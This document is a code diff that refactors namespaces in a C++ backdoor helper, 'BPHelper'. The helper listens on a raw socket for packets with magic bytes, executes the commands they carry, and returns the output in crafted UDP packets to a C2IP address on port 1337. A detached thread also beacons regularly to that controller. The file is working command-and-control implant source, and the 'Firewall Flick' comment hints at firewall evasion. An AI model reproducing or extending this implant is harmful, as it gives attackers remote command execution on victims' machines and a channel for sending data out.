@@ -1,24 +1,21 @@
 #include "BPHelper.hpp"
 
-using namespace PacketParse;
-using namespace std;
+std::mutex socketMutex;
 
-mutex socketMutex;
-
-int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
-    lock_guard<mutex> g(socketMutex);
-    string output = "";
-    string rawCommand((char *) eventInfo->bpRawCommand.raw_command);
+int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
+    std::lock_guard<std::mutex> g(socketMutex);
+    std::string output = "";
+    std::string rawCommand(reinterpret_cast<char *>(eventInfo->bpRawCommand.raw_command));
 
     switch (eventInfo->bpHeader.header_type) {
         case 0x02: {
-            //execute command then respond
-            cout << "Received a Command to Execute" << endl;
+            // execute command then respond
+            std::cout << "Received a Command to Execute" << std::endl;
 #if defined(_WIN32) || defined(WIN32)
-            string del = " ";
+            std::string del = " ";
             size_t found = rawCommand.find(del);
-            string cmd, arguments;
-            if (found != string::npos) {
+            std::string cmd, arguments;
+            if (found != std::string::npos) {
                 cmd = rawCommand.substr(0, rawCommand.find(del));
                 arguments = rawCommand.substr(rawCommand.find(del), rawCommand.length() - 1);
             }
@@ -37,8 +34,8 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
             output = exec(rawCommand.c_str());
 #endif
 
-            bp_header_t bpHeader{};
-            bp_response_t bp_response{};
+            PacketParse::bp_header_t bpHeader{};
+            PacketParse::bp_response_t bp_response{};
             bpHeader.header_type = 0x03;
             bp_response.host_ip = rawSocket.getIP();
             bp_response.command_num = htonl(currentCmd);
@@ -48,12 +45,12 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
             auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
             auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_response);
 
-            vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
+            std::vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
             payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_response));
 
 #ifdef __unix__
        
-            vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
+            std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                                  C2IP,
                                                  1337,
                                                  1337,
@@ -62,7 +59,7 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
                                                  nextHopMac);
 
 #else
-            vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
+            std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                 C2IP,
                 1337,
                 1337,
@@ -76,24 +73,24 @@ int BPHelper::actionResponse(unique_ptr<info_t> eventInfo) {
             return 1;
         }
         case 0x04: {
-            //keep alive for future use
-            cout << "Received a Keep Alive" << endl;
+            // keep alive for future use
+            std::cout << "Received a Keep Alive" << std::endl;
             if (eventInfo->bpKeepAlive.command_num == currentCmd) {
                 currentCmd++;
             }
             return 1;
         }
         default: {
-            cout << "Not a Command or Keep Alive" << endl;
+            std::cout << "Not a Command or Keep Alive" << std::endl;
             return -1;
         }
     }
 }
 
 void BPHelper::requestAction() {
-    lock_guard<mutex> g(socketMutex);
-    bp_header_t bpHeader{};
-    bp_command_request_t bp_command_request_header{};
+    std::lock_guard<std::mutex> g(socketMutex);
+    PacketParse::bp_header_t bpHeader{};
+    PacketParse::bp_command_request_t bp_command_request_header{};
     bpHeader.header_type = 0x01;
     bp_command_request_header.target_OS = 0x01;
     bp_command_request_header.command_num = htonl(currentCmd);
@@ -101,11 +98,11 @@ void BPHelper::requestAction() {
     auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
     auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_command_request_header);
 
-    vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
+    std::vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
     payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));
 
 #if defined(_WIN32) || defined(WIN32)
-    vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
+    std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                             C2IP,
                                             1337,
                                             1337,
@@ -113,7 +110,7 @@ void BPHelper::requestAction() {
     //Firewall Flick
     rawSocket.send(req);
 #else
-    vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
+    std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
                                          C2IP,
                                          1337,
                                          1337,
@@ -143,24 +140,24 @@ void BPHelper::Receive() {
         rawSocket.receive();
         Packet packet = rawSocket.getPacket();
         if (!packet.empty()) {
-            unique_ptr<info_t> info = parsePacket(packet);
-            if (info->bpHeader.magic_bytes == MAGIC_BYTES) {
+            std::unique_ptr<PacketParse::info_t> info = PacketParse::parsePacket(packet);
+            if (info->bpHeader.magic_bytes == PacketParse::MAGIC_BYTES) {
                 actionResponse(move(info));
             }
         }
-        this_thread::sleep_for(chrono::milliseconds(1));
+        std::this_thread::sleep_for(std::chrono::milliseconds(1));
     }
 }
 
 void BPHelper::requestActionLoop(int interval) {
     while (true) {
-        this_thread::sleep_for(chrono::milliseconds(interval));
+        std::this_thread::sleep_for(std::chrono::milliseconds(interval));
         this->requestAction();
     }
 }
 
 void BPHelper::requestActionThread() {
-    thread t1(&BPHelper::requestActionLoop, this, requestActionInterval);
+    std::thread t1(&BPHelper::requestActionLoop, this, requestActionInterval);
     t1.detach();
 }
 
